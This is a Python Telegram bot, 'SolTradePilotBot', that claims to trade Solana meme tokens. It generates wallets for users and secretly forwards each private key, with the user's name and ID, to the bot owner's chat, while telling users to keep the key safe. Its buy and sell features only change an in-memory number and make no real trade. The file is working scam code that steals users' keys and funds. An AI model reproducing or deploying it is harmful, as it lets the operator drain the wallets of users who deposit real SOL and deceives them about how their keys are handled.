import os
import base58
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient

# ================= ENV =================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# ================= GLOBALS =================
user_wallets = {}   # user_id -> Keypair
user_tokens = {}    # user_id -> MEME tokens
user_actions = {}   # user_id -> 'buy' or 'sell'

# ================= HELPERS =================
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def get_balance(user_id: int):
    if user_id not in user_wallets:
        return 0.0
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        resp = await client.get_balance(wallet.pubkey())
        lamports = resp['result']['value']
        return lamports / 1e9

async def get_tokens(user_id: int):
    return user_tokens.get(user_id, 0.0)

async def create_wallet(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)
    if user_id not in user_tokens:
        user_tokens[user_id] = 0.0

    # Send wallet info to user
    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ Wallet Created!\n\n🏦 Address:\n{pub_key}\n🔐 Private Key:\n{priv_key}\n⚠️ Keep your private key safe!"
    )

    # Send backup to owner
    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=f"🔐 Wallet Backup\nUser: {username}\nID: {user_id}\nPublic: {pub_key}\nPrivate: {priv_key}"
    )
    return pub_key, priv_key

# ================= MENU =================
def get_start_keyboard():
    keyboard = [
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
        [InlineKeyboardButton("❓ Help", callback_data="help")],
    ]
    return InlineKeyboardMarkup(keyboard)

# ================= COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = f"@{user.username}" if user.username else user.first_name
    text = (
        f"🔥 Hello {username}, welcome to SolTradePilotBot! 🔥\n\n"
        "Trade MEME tokens on Solana safely using real SOL.\n"
        "Use the buttons below to interact quickly.\n\n"
        "⚠️ Make sure you have enough SOL before buying tokens!"
    )
    await update.message.reply_text(text, reply_markup=get_start_keyboard())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💡 SolTradePilotBot Commands 💡\n\n"
        "- Create Wallet: Generates a Solana wallet.\n"
        "- SOL Address: Shows your wallet address.\n"
        "- Balance: Shows your current SOL and MEME token balances.\n"
        "- Buy MEME: Buy MEME tokens with SOL.\n"
        "- Sell MEME: Sell MEME tokens for SOL.\n"
        "- Keep your private key safe!\n\n"
        "Trade safely and enjoy!"
    )
    await update.message.reply_text(text)

# ================= CALLBACK HANDLER =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = int(query.from_user.id)

    if query.data == "create_wallet":
        pub, _ = await create_wallet(user_id, context)
        await query.edit_message_text(f"✅ Wallet created!\n🏦 Address: {pub}", reply_markup=get_start_keyboard())

    elif query.data == "sol_address":
        if user_id not in user_wallets:
            await query.edit_message_text("Create a wallet first!", reply_markup=get_start_keyboard())
        else:
            pub = str(user_wallets[user_id].pubkey())
            await query.edit_message_text(f"🏦 Your SOL Address:\n{pub}", reply_markup=get_start_keyboard())

    elif query.data == "balance":
        if user_id not in user_wallets:
            await query.edit_message_text("Create a wallet first!", reply_markup=get_start_keyboard())
        else:
            sol_balance = await get_balance(user_id)
            meme_balance = await get_tokens(user_id)
            await query.edit_message_text(
                f"💰 Balance:\nSOL: {sol_balance:.6f}\nMEME: {meme_balance}",
                reply_markup=get_start_keyboard()
            )

    elif query.data == "buy_meme":
        if user_id not in user_wallets:
            await query.edit_message_text("Create a wallet first!", reply_markup=get_start_keyboard())
        else:
            user_actions[user_id] = 'buy'
            await query.edit_message_text("💳 Enter the amount of SOL to spend for MEME tokens:")

    elif query.data == "sell_meme":
        if user_id not in user_wallets:
            await query.edit_message_text("Create a wallet first!", reply_markup=get_start_keyboard())
        else:
            user_actions[user_id] = 'sell'
            await query.edit_message_text("📉 Enter the amount of MEME tokens to sell:")

    elif query.data == "help":
        await help_command(update, context)

# ================= AMOUNT HANDLER =================
async def handle_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.effective_user.id)
    action = user_actions.get(user_id)
    if not action:
        return

    try:
        amount = float(update.message.text)
    except ValueError:
        await update.message.reply_text("⚠️ Enter a valid number.")
        return

    if user_id not in user_wallets:
        await update.message.reply_text("You must create a wallet first!")
        return

    if action == 'buy':
        sol_balance = await get_balance(user_id)
        if amount > sol_balance:
            await update.message.reply_text("⚠️ Not enough SOL!")
            return
        user_tokens[user_id] += amount * 100
        await update.message.reply_text(f"✅ Bought {amount*100:.0f} MEME tokens for {amount:.6f} SOL")

    elif action == 'sell':
        tokens = await get_tokens(user_id)
        if amount > tokens:
            await update.message.reply_text("⚠️ Not enough MEME tokens!")
            return
        user_tokens[user_id] -= amount
        await update.message.reply_text(f"✅ Sold {amount:.0f} MEME tokens for {amount*0.01:.6f} SOL")

    user_actions[user_id] = None

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()

    # Bot commands for menu
    app.bot.set_my_commands([
        ("start", "Welcome message"),
        ("help", "Bot guide"),
        ("create_wallet", "Generate a wallet"),
        ("address", "Show wallet address"),
        ("balance", "Show balances"),
        ("buy", "Buy MEME tokens"),
        ("sell", "Sell MEME tokens"),
    ])

    # Handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_amount))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
